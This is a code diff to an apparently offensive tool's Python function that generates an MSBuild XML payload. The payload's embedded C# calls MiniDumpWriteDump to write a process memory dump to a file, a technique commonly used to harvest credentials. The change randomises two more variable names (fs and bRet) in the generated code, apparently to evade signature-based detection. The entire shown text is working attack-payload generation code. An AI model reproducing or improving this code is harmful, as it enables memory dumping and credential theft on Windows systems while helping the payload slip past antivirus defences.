@@ -815,6 +815,8 @@ def gen_payload_msbuild(share_name, payload_name, drive_letter, addresses_array,
     MiniDumpWithThreadInfo = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     MiniDumpWithTokenInformation = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 25)))
     filename = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    fs = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    bRet = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     dumpTyp = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     prochandle = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     procid = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
@@ -883,21 +885,21 @@ def gen_payload_msbuild(share_name, payload_name, drive_letter, addresses_array,
 
     xml_payload += "        public static bool %s(string %s, Typ %s, IntPtr %s, uint %s)\n" % (Dump, filename, dumpTyp, prochandle, procid)
     xml_payload += "        {\n"
-    xml_payload += "            using (var fs = new System.IO.FileStream(%s, System.IO.FileMode.Create, System.IO.FileAccess.Write, System.IO.FileShare.None))\n" % (filename)
+    xml_payload += "            using (var %s = new System.IO.FileStream(%s, System.IO.FileMode.Create, System.IO.FileAccess.Write, System.IO.FileShare.None))\n" % (fs, filename)
     xml_payload += "            {\n"
-    xml_payload += "                bool bRet = MiniDumpWriteDump(\n"
+    xml_payload += "                bool %s = MiniDumpWriteDump(\n" % (bRet)
     xml_payload += "                  %s,\n" % (prochandle)
     xml_payload += "                  %s,\n" % (procid)
-    xml_payload += "                  fs.SafeFileHandle.DangerousGetHandle(),\n"
+    xml_payload += "                  %s.SafeFileHandle.DangerousGetHandle(),\n" % (fs)
     xml_payload += "                  (uint)%s,\n" % (dumpTyp)
     xml_payload += "                  IntPtr.Zero,\n"
     xml_payload += "                  IntPtr.Zero,\n"
     xml_payload += "                  IntPtr.Zero);\n"
-    xml_payload += "                if (!bRet)\n"
+    xml_payload += "                if (!%s)\n" % (bRet)
     xml_payload += "                {\n"
     xml_payload += "                    throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());\n"
     xml_payload += "                }\n"
-    xml_payload += "                return bRet;\n"
+    xml_payload += "                return %s;\n" % (bRet)
     xml_payload += "            }\n"
     xml_payload += "        }\n"
 
